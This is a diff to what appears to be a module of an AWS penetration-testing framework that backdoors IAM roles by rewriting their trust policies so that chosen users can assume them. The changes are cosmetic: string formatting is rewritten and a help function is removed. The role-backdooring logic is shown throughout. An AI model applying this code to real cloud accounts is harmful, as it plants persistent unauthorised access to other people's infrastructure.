@@ -38,10 +38,6 @@ parser.add_argument('--user-arns', required=False, default=None, help='A comma-s
 parser.add_argument('--no-random', required=False, action='store_true', help='If this argument is supplied in addition to a list of user ARNs, a trust relationship is created for each user in the list with each role, rather than one of them at random.')
 
 
-def help():
-    return [module_info, parser.format_help()]
-
-
 def main(args, pacu_main):
     session = pacu_main.get_active_session()
 
@@ -95,10 +91,10 @@ def main(args, pacu_main):
     for rolename in rolenames:
         target_role = 'n'
         if args.role_names is None:
-            target_role = input(f'  Do you want to backdoor the role {rolename}? (y/n) ')
+            target_role = input('  Do you want to backdoor the role {}? (y/n) '.format(rolename))
 
         if target_role == 'y' or args.role_names is not None:
-            print(f'Role name: {rolename}')
+            print('Role name: {}'.format(rolename))
             role = iam.Role(rolename)
             original_policy = role.assume_role_policy_document
             hacked_policy = modify_assume_role_policy(original_policy, user_arns, args.no_random)
@@ -111,11 +107,11 @@ def main(args, pacu_main):
                 print('  Backdoor successful!\n')
             except Exception as error:
                 if 'UnmodifiableEntity' in str(error):
-                    print(f'  Failed to update the assume role policy document for role {rolename}: This is a protected service role that is only modifiable by AWS.\n')
+                    print('  Failed to update the assume role policy document for role {}: This is a protected service role that is only modifiable by AWS.\n'.format(rolename))
                 else:
-                    print(f'  Failed to update the assume role policy document for role {rolename}: {error}\n')
+                    print('  Failed to update the assume role policy document for role {}: {}\n'.format(rolename, error))
 
-    print(f"{module_info['name']} completed.\n")
+    print('{} completed.\n'.format(module_info['name']))
     return
 
 
